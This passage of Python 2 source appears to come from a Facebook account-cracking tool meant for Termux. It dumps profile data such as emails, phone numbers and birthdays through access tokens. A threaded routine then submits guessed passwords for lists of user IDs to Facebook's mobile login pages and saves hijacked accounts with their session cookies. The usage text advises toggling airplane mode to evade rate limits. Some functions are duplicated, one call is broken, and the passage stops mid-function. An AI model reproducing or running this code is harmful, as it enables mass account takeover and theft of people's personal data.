    print '\n[ Informasi  Facebook ]'
    time.sleep(0.03)
    print '\n[\xe2\x80\xa2] name complete : %s' % nmaa
    time.sleep(0.03)
    try:
        ndpn = x['first_name']
    except (KeyError, IOError):
        ndpn = '%s-%s' % (M, N)

    print '[\xe2\x80\xa2] name front   : %s' % ndpn
    time.sleep(0.03)
    try:
        nmbl = x['last_name']
    except (KeyError, IOError):
        nmbl = '%s-%s' % (M, N)

    print '[\xe2\x80\xa2] name behind: %s' % nmbl
    time.sleep(0.03)
    try:
        hwhs = x['username']
    except (KeyError, IOError):
        hwhs = '%s-%s' % (M, N)

    print '[\xe2\x80\xa2] username fb  : %s' % hwhs
    time.sleep(0.03)
    try:
        asu = x['id']
    except (KeyError, IOError):
        asu = '%s-%s' % (M, N)

    print '[\xe2\x80\xa2] id facebook  : %s' % asu
    time.sleep(0.03)
    print '\n  * data-data account facebook *\n'
    time.sleep(0.03)
    try:
        emai = x['email']
    except (KeyError, IOError):
        emai = '%s-%s' % (M, N)

    print '[\xe2\x80\xa2] email facebook : %s' % emai
    time.sleep(0.03)
    try:
        nmrr = x['mobile_phone']
    except (KeyError, IOError):
        nmrr = '%s-%s' % (M, N)

    print '[\xe2\x80\xa2] PH Number  : %s' % nmrr
    time.sleep(0.03)
    try:
        ttll = x['birthday']
        month, day, year = ttll.split('/')
        month = bulan_ttl[month]
    except (KeyError, IOError):
        month = '%s-%s' % (M, N)
        day = '%s-%s' % (M, N)
        year = '%s-%s' % (M, N)

    print '[\xe2\x80\xa2] date of birth  : %s %s %s ' % (day, month, year)
    time.sleep(0.03)
    try:
        jenis = x['gender'].replace('female', 'Perempuan').replace('male', 'Laki-laki')
    except (KeyError, IOError):
        jenis = ''

    print '[\xe2\x80\xa2] gender  : %s ' % jenis
    try:
        r = requests.get('https://graph.facebook.com/%s/friends?limit=50000&access_token=%s' % (idt, kontol))
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])

    except:
        pass

    print '[\xe2\x80\xa2] total Friend  : %s' % str(len(id))
    time.sleep(0.03)
    try:
        r = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s' % (idt, kontol))
        z = json.loads(r.text)
        pengikut = z['summary']['total_count']
    except (KeyError, IOError):
        pengikut = '%s-%s' % (M, N)

    print '[\xe2\x80\xa2] total followers: %s' % pengikut
    time.sleep(0.03)
    try:
        lins = x['link']
    except (KeyError, IOError):
        lins = '%s-%s' % (M, N)

    print '[\xe2\x80\xa2] link facebook  : %s' % lins
    time.sleep(0.03)
    try:
        stas = x['relationship_status']
    except (KeyError, IOError):
        stas = '%s-%s' % (M, N)

    try:
        dgn = 'dengan %s' % x['significant_other']['name']
    except (KeyError, IOError):
        dgn = '%s-%s' % (M, N)
    except:
        pass

    print '[\xe2\x80\xa2] status conection: %s %s' % (stas, dgn)
    time.sleep(0.03)
    try:
        bioo = x['about']
    except (KeyError, IOError):
        bioo = '%s-%s' % (M, N)
    except:
        pass

    print '[\xe2\x80\xa2] about status : %s' % bioo
    time.sleep(0.03)
    try:
        dari = x['hometown']['name']
    except (KeyError, IOError):
        dari = '%s-%s' % (M, N)
    except:
        pass

    print '[\xe2\x80\xa2] hometown     : %s' % dari
    time.sleep(0.03)
    try:
        tigl = x['location']['name']
    except (KeyError, IOError):
        tigl = '%s-%s' % (M, N)
    except:
        pass

    print '[\xe2\x80\xa2] stay in     : %s' % tigl
    time.sleep(0.03)
    try:
        tzim = x['timezone']
    except (KeyError, IOError):
        tzim = '%s-%s' % (M, N)
    except:
        pass

    print '[\xe2\x80\xa2] time zone    : %s' % tzim
    time.sleep(0.03)
    try:
        jam = x['updated_time'][11:19]
        uptd = x['updated_time'][:10]
        year, month, day = uptd.split('-')
        month = bulan_ttl[month]
    except (KeyError, IOError):
        year = '%s-%s' % (M, N)
        month = '%s-%s' % (M, N)
        day = '%s-%s' % (M, N)
    except:
        pass

    print '[\xe2\x80\xa2] Last updated on %s month %s year %s o clock %s' % (day, month, year, jam)
    time.sleep(0.03)
    print '%s[%s#%s]' % (N, O, N), 52 * '\x1b[1;96m-\x1b[0m'
    jalan('\n[%s\xe2\x9c\x93%s] Successfully check facebook account data\n\n' % (H, N))
    exit()


def info_tools():
    os.system('clear')
    print '%s[%s#%s]' % (N, O, N), 52 * '\x1b[1;96m-\x1b[0m'
    time.sleep(0.09)
    print '%s[%s>%s] WhatsApp  : 03422008140.' % (N, H, N)
    time.sleep(0.09)
    print '%s[%s>%s] Author    : Javed Iqbal (Sad-Boy).' % (N, H, N)
    time.sleep(0.09)
    print '%s[%s>%s] Github    : Https://github.com/BALOOXH-BRAND' % (N, H, N)
    time.sleep(0.09)
    print '%s[%s>%s] Facebook  : javed Iqbal sad boy' % (N, H, N)
    time.sleep(0.09)
    print '%s[%s>%s] Instagram : Javed Iqbal Sad Boy' % (N, H, N)
    time.sleep(0.09)
    print '%s[%s#%s]' % (N, O, N), 52 * '\x1b[1;96m-\x1b[0m'
    time.sleep(0.09)
    print '%s[%s>%s] FOR THOSE WHO WANT TO DONATE' % (N, H, N)
    time.sleep(0.09)
    print '%s[%s#%s]' % (N, O, N), 52 * '\x1b[1;96m-\x1b[0m'
    time.sleep(0.09)
    print '%s[%s>%s] ph  : 03422008140' % (N, H, N)
    time.sleep(0.09)
    print '%s[%s>%s] Group : Turmux Command BXB Sad Boy' % (N, H, N)
    time.sleep(0.09)
    print '%s[%s#%s]' % (N, O, N), 52 * '\x1b[1;96m-\x1b[0m'
    time.sleep(0.09)
    print '%s[%s>%s] TEAM PROJECT XNX-CODE 2021' % (N, H, N)
    time.sleep(0.09)
    print '%s[%s#%s]' % (N, O, N), 52 * '\x1b[1;96m-\x1b[0m'
    time.sleep(0.09)
    print '%s[%s>%s] \xe2\x80\xa2 (Javed Iqbal)' % (N, H, N)
    time.sleep(0.09)
    print '%s[%s>%s] \xe2\x80\xa2 No Support its Sad Boy' % (N, H, N)
    time.sleep(0.09)
    print '%s[%s>%s] \xe2\x80\xa2 Best Friend Asim Mutual' % (N, H, N)
    time.sleep(0.09)
    print '%s[%s>%s] \xe2\x80\xa2 SAD BOY (BALOOXH-BRAND)' % (N, H, N)
    time.sleep(0.09)
    print '%s[%s#%s]' % (N, O, N), 52 * '\x1b[1;96m-\x1b[0m'
    time.sleep(0.09)
    print '%s[%s>%s] \xe2\x80\xa2 USAGE SCRIPT :' % (N, H, N)
    time.sleep(0.09)
    print '%s[%s#%s]' % (N, O, N), 52 * '\x1b[1;96m-\x1b[0m'
    time.sleep(0.09)
    print '%s[%s>%s] \xe2\x80\xa2 First We Have to Dump Id First' % (N, H, N)
    time.sleep(0.09)
    print '%s[%s>%s] \xe2\x80\xa2 Choose Numbers 1 To 4 For Dump Id' % (N, H, N)
    time.sleep(0.09)
    print '%s[%s>%s] \xe2\x80\xa2 Try the Total Theme Target 1500' % (N, H, N)
    time.sleep(0.09)
    print '%s[%s>%s] \xe2\x80\xa2 Limit Id  5000' % (N, H, N)
    time.sleep(0.09)
    print '%s[%s>%s] \xe2\x80\xa2 If You Have, Choose Number 5 To Start Cracking' % (N, H, N)
    time.sleep(0.09)
    print '%s[%s>%s] \xe2\x80\xa2 Enable Airplane Mode 5 Seconds After Crack Start' % (N, H, N)
    time.sleep(0.09)
    print '%s[%s>%s] \xe2\x80\xa2 If your still confused, call the number below' % (N, H, N)
    time.sleep(0.09)
    print '%s[%s>%s] \xe2\x80\xa2 WhatsApp : 03422008140' % (N, H, N)
    time.sleep(0.09)
    print '%s[%s#%s]' % (N, O, N), 52 * '\x1b[1;96m-\x1b[0m'
    time.sleep(0.09)
    raw_input('\n[ %sBack%s ] ' % (O, N))
    moch_yayan()


def seting_yntkts():
    print '\n[%s1%s] Ganti user agent' % (O, N)
    print '[%s2%s] Check user agent' % (O, N)
    ytbjts = raw_input('\n%s[%s?%s] menu : ' % (N, O, N))
    if ytbjts == '':
        print '\n%s[%s\xc3\x97%s] Can t be empty Kentod' % (N, M, N)
        time.sleep(2)
        seting_yntkts()
    elif ytbjts == '1':
        yo_ndak_tau_ko_tanya_saia()
    elif ytbjts == '2':
        check_yntkts()
    else:
        print '\n%s[%s\xc3\x97%s] correct input' % (N, M, N)
        time.sleep(2)
        seting_yntkts()


def yo_ndak_tau_ko_tanya_saia():
    os.system('rm -rf YNTKTS.txt')
    print '\n%s[%s\xe2\x80\xa2%s] Note: Sorry I Can t Show User Agent' % (N, O, N)
    print '[%s\xe2\x80\xa2%s] Type User Agent Or My User Agent...' % (M, N)
    anjng = raw_input('[%s?%s] Enter  User Agent :%s ' % (O, N, H))
    if anjng == '':
        print '\n%s[%s\xc3\x97%s] Can t Empty Kentod' % (N, M, N)
        yo_ndak_tau_ko_tanya_saia()
    try:
        open('YNTKTS.txt', 'w').write(anjng)
        time.sleep(2)
        jalan('\n%s[%s\xe2\x9c\x93%s] Saved User Agent' % (N, H, N))
        raw_input('%s[ %sBACK%s ]' % (N, H, N))
        moch_yayan()
    except:
        pass


def check_yntkts():
    try:
        user_agent = open('YNTKTS.txt', 'r').read()
    except IOError:
        user_agent = '%sMozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]' % H
    except:
        pass

    print '\n%s[%s\xe2\x80\xa2%s] Your Current User Agent: %s%s' % (N, O, N, H, user_agent)
    raw_input('\n%s[ %sBack%s ]' % (N, H, N))
    moch_yayan()


class __crack__():

    def __init__(self):
        self.id = []

    def plerr(self):
        try:
            self.apk = raw_input('\n%s\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90[?]%s Enter File Dump :\x1b[0;93m ' % (O, N))
            self.id = open(self.apk).read().splitlines()
            print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[\xe2\x80\xa2]%s Total Id -> %s%s%s' % (O, N, H, len(self.id), N)
        except:
            print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s\xc3\x97%s] File [%s%s%s] Wrong' % (N, M, N, M, self.apk, N)
            time.sleep(2)
            raw_input('%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[ %sBack%s ]' % (N, O, N))
            moch_yayan()

        ___yayanganteng___ = raw_input('%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[?]%s want to use \x1b[0;93m password \x1b[0;97mmanual? [y/t]: ' % (O, N))
        if ___yayanganteng___ in ('Y', 'y'):
            print '\n%s%s\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90[%s use \x1b[0;92m coma \x1b[0;97m for password separator\x1b[0;96m]' % (N, O, N)
            print '%s\xe2\x95\x91%s ' % (O, N)
            while True:
                pwek = raw_input('%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[?]%s Enter password : \x1b[0;93m' % (O, N))
                print '\x1b[0;96m\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[\xe2\x80\xa2] \x1b[0;97m Crack with password [%s%s%s]' % (H, pwek, N)
                if pwek == '':
                    print '%s[%s\xc3\x97%s] don t empty kentod ' % (N, M, N)
                elif len(pwek) <= 5:
                    print '%s[%s\xc3\x97%s] password minimum 6 characters' % (N, M, N)
                else:

                    def __yan__(ysc=None):
                        global cp
                        global ok
                        cin = raw_input('\x1b[0;96m\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[?] \x1b[0;97mMethod: ')
                        print '%s\xe2\x95\x91%s ' % (O, N)
                        if cin == '':
                            print '%s[%s\xc3\x97%s] Don t Empty' % (N, M, N)
                            self.__yan__()
                            print '%s\xe2\x95\x91%s ' % (O, N)
                        elif cin == '1':
                            print '\x1b[0;96m\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s\xe2\x80\xa2%s\x1b[0;96m] \x1b[0;97mId OK Saved In > Results/OK-%s-%s-%s.txt' % (O, N, ha, op, ta)
                            print '\x1b[0;96m\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s\xe2\x80\xa2%s\x1b[0;96m] \x1b[0;97mId  CP Saved In > Results/CP-%s-%s-%s.txt' % (O, N, ha, op, ta)
                            print '\x1b[0;96m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[%s!%s\x1b[0;96m] \x1b[0;97mMode Pesawatkan 3 Detik Setelah Crack Dimulai\n' % (H, N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__api__, kimochi, ysc)
                                    except:
                                        pass

                            os.remove(self.apk)
                            hasil(ok, cp)
                            print '%s\xe2\x95\x91%s ' % (O, N)
                        elif cin == '2':
                            print '\x1b[0;96m\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s\xe2\x80\xa2%s\x1b[0;96m] \x1b[0;97mAkun OK Saved In > Results/OK-%s-%s-%s.txt' % (O, N, ha, op, ta)
                            print '\x1b[0;96m\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s\xe2\x80\xa2%s\x1b[0;96m] \x1b[0;97mAkun CP Saved In > Results/CP-%s-%s-%s.txt' % (O, N, ha, op, ta)
                            print '\x1b[0;96m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[%s!%s\x1b[0;96m] \x1b[0;97mMode Pesawatkan 3 Detik Setelah Crack Dimulai\n' % (H, N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mbasic__, kimochi, ysc)
                                    except:
                                        pass

                            os.remove(self.apk)
                            hasil(ok, cp)
                            print '%s\xe2\x95\x91%s ' % (O, N)
                        elif cin == '3':
                            print '\x1b[0;96m\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s\xe2\x80\xa2%s\x1b[0;96m] \x1b[0;97mAkun OK Saved In > Results/OK-%s-%s-%s.txt' % (O, N, ha, op, ta)
                            print '\x1b[0;96m\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s\xe2\x80\xa2%s\x1b[0;96m] \x1b[0;97mAkun CP Saved In > Results/CP-%s-%s-%s.txt' % (O, N, ha, op, ta)
                            print '\x1b[0;96m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[%s!%s\x1b[0;96m] \x1b[0;97mMode Pesawatkan 3 Detik Setelah Crack Dimulai\n' % (H, N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mbasic__, kimochi, ysc)
                                    except:
                                        pass

                            os.remove(self.apk)
                            hasil(ok, cp)
                            print '%s\xe2\x95\x91%s ' % (O, N)
                        elif cin == '4':
                            print '\x1b[0;96m\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s\xe2\x80\xa2%s\x1b[0;96m] \x1b[0;97mAkun OK Saved In > Results/OK-%s-%s-%s.txt' % (O, N, ha, op, ta)
                            print '\x1b[0;96m\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s\xe2\x80\xa2%s\x1b[0;96m] \x1b[0;97mAkun CP Saved In > Results/CP-%s-%s-%s.txt' % (O, N, ha, op, ta)
                            print '\x1b[0;96m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[%s!%s\x1b[0;96m] \x1b[0;97mMode Pesawatkan 3 Detik Setelah Crack Dimulai\n' % (H, N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mfb, __, kimochi, ysc)
                                    except:
                                        pass

                            os.remove(self.apk)
                            hasil(ok, cp)
                            print '%s\xe2\x95\x91%s ' % (O, N)
                        elif cin == '5':
                            print '\x1b[0;96m\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s\xe2\x80\xa2%s\x1b[0;96m] \x1b[0;97mAkun OK Saved In > Results/OK-%s-%s-%s.txt' % (O, N, ha, op, ta)
                            print '\x1b[0;96m\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s\xe2\x80\xa2%s\x1b[0;96m] \x1b[0;97mAkun CP Saved In > Results/CP-%s-%s-%s.txt' % (O, N, ha, op, ta)
                            print '\x1b[0;96m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[%s!%s\x1b[0;96m] \x1b[0;97m Airplane Mode 3 Seconds After Crack Starts\n' % (H, N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mfb, __, kimochi, ysc)
                                    except:
                                        pass

                            os.remove(self.apk)
                            hasil(ok, cp)
                        else:
                            print '\n%s[%s\xc3\x97%s] input Correct' % (N, M, N)
                            self.__yan__()

                    print '%s\xe2\x95\x91%s ' % (O, N)
                    print '\x1b[0;96m\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[ \x1b[0;93mSilahkan Pilih Metode Untuk Login \x1b[0;96m]'
                    print '%s\xe2\x95\x91%s ' % (O, N)
                    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[1]%s Method \x1b[0;93mApi \x1b[0;97mv1 \x1b[0;96m[\x1b[0;93m Fast\x1b[0;96m]' % (O, N)
                    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[2]%s Method \x1b[0;93mApi \x1b[0;97mv2' % (O, N)
                    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[3]%s Method \x1b[0;93mMbasic \x1b[0;97mv1 \x1b[0;96m[\x1b[0;93m Slow\x1b[0;96m]' % (O, N)
                    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[4]%s Method \x1b[0;93mMbasic \x1b[0;97mv2' % (O, N)
                    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[5]%s Method \x1b[0;93mMobile \x1b[0;96m[\x1b[0;93mVery Slow\x1b[0;96m]' % (O, N)
                    print '%s\xe2\x95\x91%s ' % (O, N)
                    __yan__(pwek.split(','))
                    break

        elif ___yayanganteng___ in ('T', 't'):
            print '\n\x1b[0;96m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90[ \x1b[0;93m Please Select Method To Login \x1b[0;96m]'
            print '%s\xe2\x95\x91%s ' % (O, N)
            print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[1]%s Method \x1b[0;93mApi \x1b[0;97mv1 \x1b[0;96m[\x1b[0;93mFast\x1b[0;96m]' % (O, N)
            print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[2]%s Method \x1b[0;93mApi \x1b[0;97mv2' % (O, N)
            print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[3]%s Method \x1b[0;93mMbasic \x1b[0;97mv1 \x1b[0;96m[\x1b[0;93mSlow\x1b[0;96m]' % (O, N)
            print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[4]%s Method \x1b[0;93mMbasic \x1b[0;97mv2' % (O, N)
            print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[5]%s Method \x1b[0;93mMobile \x1b[0;96m[\x1b[0;93mVery Slow\x1b[0;96m]' % (O, N)
            print '%s\xe2\x95\x91%s ' % (O, N)
            self.__pler__()
        else:
            print '%s%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[%s y/t idiot ]' % (N, K, N)
            time.sleep(2)
            moch_yayan()
        return

    def __api__(self, user, __yan__):
        global loop
        (
         sys.stdout.write('\r%s[\xe2\x80\xa2\xe2\x80\xa2]%s\x1b[096m[\x1b[097mCrack\x1b[096m][\x1b[097m%s/%s\x1b[096m][\x1b[092mOK:%s\x1b[097m][\x1b[093mCP:%s\x1b[097m] ' % (O, N, loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try:
                os.mkdir('results')
            except:
                pass

            try:
                _kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
                _kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'

            ses = requests.Session()
            ses.headers.update({'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': _kontol, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://m.facebook.com')
            b = ses.post('https://m.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'})
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r%s[OK] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s                 %s' % (H, user, pw, kuki, N)
                wrt = '\xe2\x95\xa0[Ok] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s' % (user, pw, kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r%s[CP] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s     %s' % (O, user, pw, day, month, year, N)
                    wrt = '\xe2\x95\xa0[Cp] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s' % (user, pw, day, month, year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day = ''
                    year = ''
                except:
                    pass

                print '\r%s[CP] %s \xe2\x80\xa2 %s                %s' % (K, user, pw, N)
                wrt = '\xe2\x95\xa0[Cp] %s \xe2\x80\xa2 %s' % (user, pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def __api__(self, user, __yan__):
        global loop
        (
         sys.stdout.write('\r%s[\xe2\x80\xa2\xe2\x80\xa2]%s\x1b[096m[\x1b[097mCrack\x1b[096m][\x1b[097m%s/%s\x1b[096m][\x1b[092mOK:%s\x1b[097m][\x1b[093mCP:%s\x1b[097m] ' % (O, N, loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try:
                os.mkdir('results')
            except:
                pass

            try:
                _kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
                _kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'

            ses = requests.Session()
            ses.headers.update({'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': _kontol, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://m.facebook.com')
            b = ses.post('https://m.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'})
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r%s[OK] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s                 %s' % (H, user, pw, kuki, N)
                wrt = '\xe2\x95\xa0[Ok] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s' % (user, pw, kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r%s[CP] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s     %s' % (O, user, pw, day, month, year, N)
                    wrt = '\xe2\x95\xa0[Cp] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s' % (user, pw, day, month, year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day = ''
                    year = ''
                except:
                    pass

                print '\r%s[CP] %s \xe2\x80\xa2 %s                %s' % (K, user, pw, N)
                wrt = '\xe2\x95\xa0[Cp] %s \xe2\x80\xa2 %s' % (user, pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def __mbasic__(self, user, __yan__):
        global loop
        (
         sys.stdout.write('\r%s[\xe2\x80\xa2\xe2\x80\xa2]%s\x1b[096m[\x1b[097mCrack\x1b[096m][\x1b[097m%s/%s\x1b[096m][\x1b[092mOK:%s\x1b[097m][\x1b[093mCP:%s\x1b[097m] ' % (O, N, loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try:
                os.mkdir('results')
            except:
                pass

            try:
                _kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
                _kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'

            ses = requests.Session()
            ses.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': _kontol, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://mbasic.facebook.com')
            b = ses.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'})
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r%s[OK] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s                 %s' % (H, user, pw, kuki, N)
                wrt = '\xe2\x95\xa0[Ok] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s' % (user, pw, kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r%s[CP] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s     %s' % (O, user, pw, day, month, year, N)
                    wrt = '\xe2\x95\xa0[Cp] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s' % (user, pw, day, month, year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day = ''
                    year = ''
                except:
                    pass

                print '\r%s[CP] %s \xe2\x80\xa2 %s                %s' % (K, user, pw, N)
                wrt = '\xe2\x95\xa0[Cp] %s \xe2\x80\xa2 %s' % (user, pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def __mbasic__(self, user, __yan__):
        global loop
        (
         sys.stdout.write('\r%s[\xe2\x80\xa2\xe2\x80\xa2]%s\x1b[096m[\x1b[097mCrack\x1b[096m][\x1b[097m%s/%s\x1b[096m][\x1b[092mOK:%s\x1b[097m][\x1b[093mCP:%s\x1b[097m] ' % (O, N, loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try:
                os.mkdir('results')
            except:
                pass

            try:
                _kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
                _kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'

            ses = requests.Session()
